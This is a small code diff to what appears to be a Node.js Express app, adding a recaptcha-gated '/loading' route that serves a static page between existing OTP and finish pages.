@@ -188,6 +188,11 @@ app.get('/otp', checkRecaptchaSession, (req, res) => {
     res.sendFile(join(__dirname, '/cp/otp/page.html'));
 });
 
+app.get('/loading', checkRecaptchaSession, (req, res) => {
+    res.sendFile(join(__dirname, '/cp/loading/page.html'));
+});
+
+
 app.get('/finish', checkRecaptchaSession, (req, res) => {
     res.sendFile(join(__dirname, '/cp/finish/page.html'));
 });
